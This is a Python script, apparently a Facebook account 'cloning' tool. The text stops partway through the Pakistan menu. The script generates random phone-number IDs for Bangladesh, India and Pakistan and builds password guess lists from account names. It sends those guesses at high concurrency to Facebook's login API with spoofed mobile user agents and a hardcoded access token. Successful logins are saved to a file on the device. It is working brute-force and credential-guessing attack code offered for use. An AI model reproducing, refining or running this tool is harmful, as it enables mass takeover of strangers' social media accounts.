#------[MODIUL-Library]--------#
import marshal
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('git pull')
##____ANIMATION__________#####
def ema():
	animation = ["[\x1b[1;96m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;91m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;97m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
	for i in range(20):
		time.sleep(0.1)
		sys.stdout.write(f"\r[\x1b[1;92m•\x1b[1;97m] \x1b[38;5;42mLOADING...........\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
		sys.stdout.flush()
	os.getuid
#-------COLOR-CODE------#
MIX_COLOR = '\033[1;91m','\033[1;32m','\033[1;93m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[38;5;48m','\033[38;5;47m','\033[38;5;46m','\033[38;5;95m','\033[38;5;44m','\033[38;5;43m','\033[38;5;42m','\033[38;5;41','\033[38;5;40m'
#------[DATA-TIME]------#
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
##____[Loop]_____####
loop = 0
oks = []
cps = []
cokbrut=[]
ses=requests.Session()
uat = []
ugen2 = []
ugen = []
methods=[]
android_models=[]
#--------[proxy]---------#
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
 prox=open('.prox.txt','r').read().splitlines()
#--------[-user-agent-]---------# 
sam = random.choice(["SM-J100F", "SM-J100FN", "SM-J100H", "SM-J100H", "SM-J100H", "SM-J100M", "SM-J100MU", "SM-J100ML", "SM-J100VPP", "SM-J100Y", "SM-J105F", "SM-j105H", "SM-J105H", "SM-J105B", "SM-J105Y", "SM-J105M", "SM-J200F", "SM-J200G", "SM-J200H", "SM-J200GU", "SM-J200M", "SM-J200Y", "SM-J260A", "SM-J260AZ", "SM-S260DL", "SM-J320H", "SM-J3109", "SM-J320FN", "SM-J320P", "SM-J320F", "SM-J320M", "SM-J320Y", "SM-J320A", "SM-J320G", "SM-J327T1", "SM-J320V", "SM-J320YZ", "SM-J320W8", "SM-J320ZN", "SM-J320N0", "SM-J320R4", "SM-A326B", "SM-A326B", "SM-A326BR", "SM-A326BR", "SM-A326U", "SM-A326W", "SM-A326U1", "SM-A326K", "SCG08", "SM-S326DL", "SM-M022F", "SM-M022F", "SM-M022G", "SM-M022G", "GT-I9200", "GT-I9205", "GT-I9200X", "SGH-i527", "SGH-I527", "SM-N900", "SM-N9002", "SM-N9005", "SM-N9007", "SM-N9008", "SM-N9008S", "SM-N9008V", "SM-N9009", "SM-N9009V", "SM-N900A", "SM-N900K", "SM-N900L", "SM-N900P", "SM-N900R4", "SM-N900S", "SM-N900T", "SM-N900U", "SM-N900V", "SM-N900W8", "SM-N900X", "SM-N9000Q", "SM-N9006", "SM-9005"])
for xd in range(2000):
    rr = random.randint; rc = random.choice
    aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
    lonte = f"{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}"
    build_nokiax = ['JDQ39','JZO54K']
    oppo = ["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"]
    redmi = ["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"]
    realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
    infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X6"]
    sams = ["SM-J100F", "SM-J100FN", "SM-J100H", "SM-J100H", "SM-J100H", "SM-J100M", "SM-J100MU", "SM-J100ML", "SM-J100VPP", "SM-J100Y", "SM-J105F", "SM-j105H", "SM-J105H", "SM-J105B", "SM-J105Y", "SM-J105M", "SM-J200F", "SM-J200G", "SM-J200H", "SM-J200GU", "SM-J200M", "SM-J200Y", "SM-J260A", "SM-J260AZ", "SM-S260DL", "SM-J320H", "SM-J3109", "SM-J320FN", "SM-J320P", "SM-J320F", "SM-J320M", "SM-J320Y", "SM-J320A", "SM-J320G", "SM-J327T1", "SM-J320V", "SM-J320YZ", "SM-J320W8", "SM-J320ZN", "SM-J320N0", "SM-J320R4", "SM-A326B", "SM-A326B", "SM-A326BR", "SM-A326BR", "SM-A326U", "SM-A326W", "SM-A326U1", "SM-A326K", "SCG08", "SM-S326DL", "SM-M022F", "SM-M022F", "SM-M022G", "SM-M022G", "GT-I9200", "GT-I9205", "GT-I9200X", "SGH-i527", "SGH-I527", "SM-N900", "SM-N9002", "SM-N9005", "SM-N9007", "SM-N9008", "SM-N9008S", "SM-N9008V", "SM-N9009", "SM-N9009V", "SM-N900A", "SM-N900K", "SM-N900L", "SM-N900P", "SM-N900R4", "SM-N900S", "SM-N900T", "SM-N900U", "SM-N900V", "SM-N900W8", "SM-N900X", "SM-N9000Q", "SM-N9006", "SM-9005"]
for t in range(5000):
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='SM-A510F '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)
for xd in range(5000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]'
    prodi=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(prodi)
for agent in range(5000):
        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Infinix X655F'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt) 
        
def uaa():
	facebook_verson = f"{random.randint(200, 450)}.{random.randint(0, 0)}.{random.randint(0,0)}.{random.randint(20, 40)}.{random.randint(70, 130)}"
	fbbv = str(random.randint(10000000,66666666))
	fbrv = str(random.randint(0000000000,999999999))
	density = random.choice(['2.0'])
	width = random.choice(['720'])
	height = random.choice(['1344'])
	ua = f"[FBAN/FB4A/;FBAV/{str(facebook_verson)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_verson)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/;FB_FW/1;]"
	return ua
#os.system('xdg-open https://chat.whatsapp.com/HzlrTrFpKUY9CUsMagYg3r')
##_______MY__LOGO______####
logo = """
 \033[1;95m █████╗ \033[1;92m██╗     \033[1;96m██╗\033[1;91m███╗   ██╗\033[1;94m██╗   ██╗\033[1;93m██████╗ \033[1;95m
 \033[1;95m██╔══██╗\033[1;92m██║     \033[1;96m██║\033[1;91m████╗  ██║\033[1;94m██║   ██║\033[1;93m██╔══██╗
 \033[1;95m███████║\033[1;92m██║     \033[1;96m██║\033[1;91m██╔██╗ ██║\033[1;94m██║   ██║\033[1;93m██████╔╝
 \033[1;95m██╔══██║\033[1;92m██║     \033[1;96m██║\033[1;91m██║╚██╗██║\033[1;94m██║   ██║\033[1;93m██╔══██╗
 \033[1;95m██║  ██║\033[1;92m███████╗\033[1;96m██║\033[1;91m██║ ╚████║\033[1;94m╚██████╔╝\033[1;93m██║  ██║
 \033[1;95m╚═╝  ╚═╝\033[1;92m╚══════╝\033[1;96m╚═╝\033[1;91m╚═╝  ╚═══╝ \033[1;94m╚═════╝ \033[1;93m╚═╝  ╚═╝
\033[1;35m┌────────────────────────────────────────────┐
\033[1;95m|\033[1;35m-(*)\033[1;36m CREATED  : ALINUR RAHMAN          \033[1;95m     |
\033[1;95m|\033[1;34m-(*)\033[1;32m FACEBOOK : ALINUR RAHMAN             \033[1;95m  |
\033[1;95m|\033[1;33m-(*)\033[1;33m GITHUB   : CYBER-TECH9               \033[1;95m  |
\033[1;95m|\033[1;35m-(*)\033[1;36m STETAS   : RANDOM & FILE CLONIG     \033[1;95m   |
\033[1;95m|\033[1;36m-(*)\033[1;32m TYPE     : FREE                      \033[1;95m  |
\033[1;95m|\033[1;33m-(*)\033[1;37m VIRSON   : 0.9                       \033[1;95m  |
\033[1;35m└────────────────────────────────────────────┘"""
def linex():
	print(f'\x1b[1;95m──────────────────────────────────────────────')
##_________DEF_MAIN__MENU________#
def main():
    os.system('clear');print(logo);linex()
    print('\033[38;5;45m| [=] [1] RANDOM CLONING ')
    print('\033[1;96m| [=] [2] FILE CLONING ')
    print('\x1b[38;5;41m| [=] [4] CONTACT ME ')
    print('\033[1;91m| [=] [0] EXIT')
    linex()
    t=input('\x1b[38;5;46m[=] YOUR CHOICE : ')
    if t in ["1","01"]:
    	crack_menu()
    elif t in ["2","02"]:
    	File()
    elif t in ["4","04"]:
    	os.system("xdg-open https://www.facebook.com/alinur918604?mibextid=ZbWKwL")
    elif t in ["0","00"]:
    	os.system('exit')

###____FILE___CLONING_____###
def File():
	os.system("clear");print(logo);linex()
	print('\033[38;5;44m| [=] [1] File Cloning ')
#	print('\033[1;93m| [=] [2] File Create ')
	print('\033[1;96m| [=] [0] Back Menu ')
	linex()
	bb = input('\033[38;5;40m| Select Option : ')
	if bb =='1':
		file_clone()
	elif bb =='2':
		create()
	elif bb =='0':
		main()
	else:
		print('Select Creact Option ')
		exit()
		
def file_clone():
    os.system("clear");print(logo);linex()
    fl=input("| [=]\033[38;5;46m File Path : ")
    linex()
    try:
        fileeee=open(fl,"r").read().splitlines()
    except:
        print("  [✓] \033[38;5;46mFile Does not found")
        linex()
        file_clone()
    auto_pass(fileeee)



def auto_pass(fileeee):
    tl=str(len(fileeee))
    print('\033[92;1m| [=] Total id  : '+tl)
    print('\033[1;97m| [=] Airplane ✈️ Mode On/Off')
    linex()
    with ThreadPool (max_workers=120) as feel:
        for data in fileeee:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append('57273200')
            pwx.append('59039200')
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(nam1+'123')
                    pwx.append(name1+'12')
                    pwx.append(name1+'123')
                    pwx.append(name1+' 123')
                    pwx.append(name1+'1234')
                    pwx.append(name1+'12345')
                    pwx.append(name1+'@#')
                    pwx.append(name1+'@@')
                    pwx.append(name1+'@@@')
                    pwx.append(name1+'@')
                    pwx.append(name1+'@123')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2)
                    pwx.append(mid_name+'12')
                    pwx.append(mid_name+'123')
                    pwx.append(mid_name+' 123')
                    pwx.append(mid_name+'1234')
                    pwx.append(mid_name+'12345')
                    pwx.append(mid_name+'@#')
                    pwx.append(mid_name+'@@')
                    pwx.append(mid_name+'@')
                    pwx.append(mid_name+'@123')
                    #-Mix
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+'12')
                    pwx.append(name1+mid_name+'123')
                    pwx.append(name1+mid_name+'1234')
                    pwx.append(name1+mid_name+'12345')
                    pwx.append(name1+mid_name+'@#')
                    pwx.append(name1+mid_name+'@@')
                    pwx.append(name1+mid_name+'@')
                    pwx.append(name1+mid_name+'@123')
                    pwx.append(name1+' '+mid_name)
                    pwx.append(name1+' '+mid_name+'123')
                    pwx.append(name1+' '+mid_name+'1234')
                    pwx.append(name1+' '+mid_name+'12345')
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    pwx.append(sur_name+'123')
                    pwx.append(sur_name+'1234')
                    pwx.append(sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name)
                    pwx.append(name1+mid_name+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name+'1234')
                    pwx.append(name1+mid_name+sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name+'@#')
                    pwx.append(name1+mid_name+sur_name+'@@')
                    pwx.append(name1+mid_name+sur_name+'@')
                    pwx.append(name1+' '+mid_name+' '+sur_name)
                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
            except:pass
            feel.submit(file_subb,uid,pwx)

def file_subb(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r\033[38;5;46m[ALINUR] {loop} = [{str(len(oks))}]");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r\033[92;1m[ALINUR-OK] {uid} • {ps}      ")
                open("/sdcard/FILE-Ok.txt","a").write(uid+" • "+ps+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r\033[92;1m[ALINUR-OK] {uid} • {ps}      ")
                open("/sdcard/FILE-Ok.txt","a").write(uid+" • "+ps+"\n")
                oks.append(uid)
            elif "www.facebook.com" in q:
                print(f"\r\r\033[1;96m[LOOKED] {uid} • {ps}      ")
                cps.append(uid)
            else:
                continue
        loop+=1
    except:
        time.sleep(4)
##_______FB____menu____###
def crack_menu():
	print("\x1b[1;96m[+]....PLZ WITH LOADING FB MENU")
	animation = ["[\x1b[1;96m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;91m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;97m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
	for i in range(10):
		time.sleep(0.1)
		sys.stdout.write(f"\r[\x1b[1;92m•\x1b[1;97m] \x1b[38;5;42mLoading......\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
		sys.stdout.flush()
	os.getuid
	os.system("clear");print(logo);linex()
	print('\033[1;92m|—(*)~\033[1;92m[1] BD CLONING')
	print('\033[1;93m|—(*)~\033[1;93m[2] INDIA CLONING')
	print('\033[1;96m|—(*)~\033[1;96m[3] PAKISTAN CLONING ')
	print('\033[1;94m|—(*)~\033[1;94m[4] AFGHANISTAN CLONING ')
	print('\033[1;97m|—(*)~\033[1;97m[5] NEPAL CLONINGE ')
	print('\033[1;92m|—(*)~\033[38;5;202m[0] BACK TO MENU')
	linex()
	mix =input('\033[95;1m[+]\033[93;1m Choice Option : ')
	if mix =='1':
		bd()
	elif mix =='2':
		ind()
	elif mix =='3':
		pak()
	elif mix=='4':
		Afg()
	elif mix =='5':
		Nepal()
	elif mix =='0':
		main()
	else:
		print("Inviled option")
		time.sleep(2)
		crack_menu()    
		
###_____BANGLADESH___######
def bd():
    user=[]
    os.system("clear")
    print(logo)
    linex()
    print('\033[1;96m|—(*)  SIM CODE : 017 , 016 , 018 ,019 ')
    linex()
    code = input(f'\x1b[38;5;155m[=] YOUR CHOICE : ')
    linex()
    print('\033[1;92m|—(*)~[1]\x1b[38;5;84m~ METHOD~[B-GRAPH]')
    print('\033[1;93m|—(*)~[2]\x1b[38;5;155m~ METHOD~[NORMARL]')
    linex()
    math = input('\033[92;1m[~] CHOICE METHOD : ')
    janu=[]
    if math in ["1"]:
    	janu.append("M1")
    if math in ["2"]:
    	janu.append("M2")
    
    linex()
    print('\033[1;92m|—(*) LIMIT : 5000 , 10000 , 50000 ')
    linex()
    limit = int(input('\x1b[38;5;155m[=] YOUR CHOICE : '))
    os.system("clear")
    print(logo)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as JAN:
        tl = str(len(user))
        sex = janu[0]
        linex()
        print('\033[1;95m|—(*) \033[1;92mSIM CODE : '+code) 
        print('\033[1;96m|—(*) \033[1;93mTOTAL CRECK : '+tl)
        print('\033[1;97m|—(*) \033[1;96mAIRPLANE MODE \033[1;91m[\033[1;96mON°\033[1;91mOF\033[1;91m] \033[1;96m')
        linex()
        for love in user:
            pwx = [love,'bangladesh','456378','281796','672070','624087','532795','275357','374258','57273200','Jannat','aysha','abir123']
            ids = code+love
            if "M1" in janu:
            	JAN.submit(api,ids,pwx,tl)
            if "M2" in janu:
            	JAN.submit(normal,ids,pwx,tl)
            if "M3" in janu:
            	JAN.submit(host,ids,pwx,tl)
    print('TOTAL OK \033[1;92m'+str(len(oks)))
    input('PRESS ENTER TO BACK ')
    crack_menu()

#________INDIA_____DEF___MENU___#####

def ind():
    user=[]
    os.system("clear")
    print(logo)
    linex()
    print('\033[1;96m|—(*) India Sim Code : +91789 , +91945 , +91955 , +91935 ')
    linex()
    code = input(f'\x1b[38;5;155m[=] YOUR CHOICE : ')
    linex()
    print('\033[1;92m|—(*)~[1]\x1b[38;5;84m~ METHOD~[B-GRAPH]')
    print('\033[1;93m|—(*)~[2]\x1b[38;5;48m~ METHOD~[NORMARL]')    
    linex()
    math = input('\033[92;1m[~] CHOICE METHOD : ')
    janu=[]
    if math in ["1"]:
    	janu.append("M1")
    if math in ["2"]:
    	janu.append("M2")   
    linex()
    print('\033[1;92m|—(*) LIMIT : 5000 , 10000 , 50000 ')
    linex()
    limit = int(input('\x1b[38;5;155m[=] YOUR CHOICE : '))
    os.system("clear")
    print(logo)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ALINUR:
        tl = str(len(user))
        sex = janu[0]
        linex()
        print('\033[1;95m|—(*) \033[1;92mSIM CODE : '+code) 
        print('\033[1;96m|—(*) \033[1;93mTOTAL CRECK : '+tl)
        print('\033[1;97m|—(*) \033[1;96mAIRPLANE MODE \033[1;91m[\033[1;96mON°\033[1;91mOF\033[1;91m] \033[1;96m')
        linex()
        for love in user:
            pwx = [love[2:],love,code+love,code+love[:3],'hindustan','kingkhan','india123','57273200','57575751','59039200','123412','224455','113322','225566','112255','223355','50607080','77889900','60708090','09876543','00998877']
            ids = code+love
            if "M1" in janu:
            	ALINUR.submit(api,ids,pwx,tl)
            if "M2" in janu:
            	ALINUR.submit(normal,ids,pwx,tl)
            if "M3" in janu:
            	ALINUR.submit(host,ids,pwx,tl)
    print('TOTAL OK \033[1;92m'+str(len(oks)))
    input('PRESS ENTER TO BACK ')
    crack_menu()
    
###_____PAKISTAN___CLONING_____###
def pak():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    linex()
    print('\033[1;96m|—(*)  PAK CODES : \033[38;5;40m92301 , 92302 , 92303 , 92305 \033[0;97m')
    linex()
    code = input(f'\x1b[38;5;155m[=] YOUR CHOICE : ')
    linex()
    print('\033[1;92m|—(*)~[1]\x1b[38;5;84m~ METHOD~[B-GRAPH]')
    print('\033[1;93m|—(*)~[2]\x1b[38;5;208m~ METHOD~[NORMARL]')    
    linex()
    math = input('\033[92;1m[~] CHOICE METHOD : ')
    janu=[]
    if math in ["1"]:
    	janu.append("M1")
    if math in ["2"]:
    	janu.append("M2")
    
    linex()
    print('\033[1;92m|—(*) LIMIT : 5000 , 10000 , 50000 ')
    linex()
    limit = int(input('\x1b[38;5;155m[=] YOUR CHOICE : '))
    os.system("clear")
    print(logo)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
